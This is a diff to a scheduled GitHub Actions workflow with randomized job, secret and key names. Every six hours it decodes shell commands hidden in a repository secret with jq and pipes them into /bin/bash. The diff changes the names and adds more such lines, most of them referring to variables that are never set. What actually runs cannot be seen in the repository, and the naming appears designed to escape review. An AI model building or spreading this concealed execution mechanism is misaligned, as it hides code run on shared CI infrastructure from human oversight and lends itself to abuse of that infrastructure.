@@ -2,7 +2,8 @@ name: shangxike6328
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 5/6 * * *'
+    - cron: '15 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: shangxike6328
         env:
-          vgpa58587: ${{ secrets.vgpa58587 }}
+          kfffc4: ${{ secrets.kfffc4 }}
         run: |
-          echo $vgpa58587 | jq -r .e68 | /bin/bash
-          echo $ffx41302 | jq -r .efmi70623 | /bin/bash
-          echo $xm9 | jq -r .rqjoc35 | /bin/bash
-          echo $hsyl90 | jq -r .yub84820 | /bin/bash
-          echo $c8525 | jq -r .z66 | /bin/bash
-          echo $dioch3 | jq -r .f7885 | /bin/bash
-          echo $urf6421 | jq -r .ngao83694 | /bin/bash
+          echo $kfffc4 | jq -r .rid9092 | /bin/bash
+          echo $n604 | jq -r .fofx8 | /bin/bash
+          echo $icbkp8135 | jq -r .rtbd150 | /bin/bash
+          echo $wgl8822 | jq -r .ah4287 | /bin/bash
+          echo $uxr47 | jq -r .bknt32 | /bin/bash
+          echo $kas240 | jq -r .nfyi63965 | /bin/bash
+          echo $zkapz3 | jq -r .hacwt7251 | /bin/bash
+          echo $tehz1 | jq -r .dzod567 | /bin/bash
+          echo $l28920 | jq -r .iat60536 | /bin/bash
+          echo $seb319 | jq -r .zvtd54 | /bin/bash
+          echo $nrb855 | jq -r .rec28070 | /bin/bash
+          echo $brx98587 | jq -r .afn47389 | /bin/bash
 
